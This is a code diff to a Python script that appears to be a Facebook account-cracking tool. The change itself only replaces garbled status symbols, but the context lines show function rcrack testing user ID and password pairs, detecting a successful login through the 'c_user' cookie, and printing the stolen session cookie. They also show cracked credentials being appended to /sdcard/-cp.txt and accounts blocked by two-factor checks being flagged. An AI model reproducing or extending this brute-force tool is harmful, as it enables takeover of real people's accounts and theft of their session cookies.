@@ -189,9 +189,9 @@ def cek_apk(coki):
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
-        print(f'\r%s[%sï¿½%s] %\033[0;106m & WEBSITE NOT FOUND \033[0;102m %s'%(N,M,N,M,N))
+        print(f'\r%s[%s×%s] %\033[0;106m & WEBSITE NOT FOUND \033[0;102m %s'%(N,M,N,M,N))
     else:
-        print(f'\r\033[1;93m[\033[0;93mï¿½\033[1;93m] %\033[0;102m ACTIVE APPS & WEBSITE :\033[0m'%(B))
+        print(f'\r\033[1;93m[\033[0;93m•\033[1;93m] %\033[0;102m ACTIVE APPS & WEBSITE :\033[0m'%(B))
         for i in range(len(game)):
             print(f"\r%s%s. %s%s"%(N,i+1,game[i].replace("Added to"," Added to"),N))
         #else:
@@ -299,7 +299,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\033[1;34m[\033[\033[0;101m\033[0m[\033[1;32mOK\033[1;34m]\033[1;32m'+uid+'\033[1;32m ï¿½ \033[1;32m'+ps+'')
+                print('\033[1;34m[\033[\033[0;101m\033[0m[\033[1;32mOK\033[1;34m]\033[1;32m'+uid+'\033[1;32m • \033[1;32m'+ps+'')
                 os.system("play-audio m4.mp3")
                 print('\r\033[0;101mCOOKIE \033[0m=''\033[1;32m'+coki+'\033[0m''\033[0m')
                # cek_apk(session,coki)
@@ -313,7 +313,7 @@ def rcrack(uid,pwx,tl):
                 open('/sdcard/-cp.txt', 'a').write( uid+' | '+ps+' \n')
                # cps.append(cid)
             elif twf in session.cookies.get_dict().keys():
-                print('\033[1;93m\033[0;34m-2F '+uid+' ï¿½ '+ps+'  \033[0;97m')
+                print('\033[1;93m\033[0;34m-2F '+uid+' • '+ps+'  \033[0;97m')
                 break
             else:
                 continue
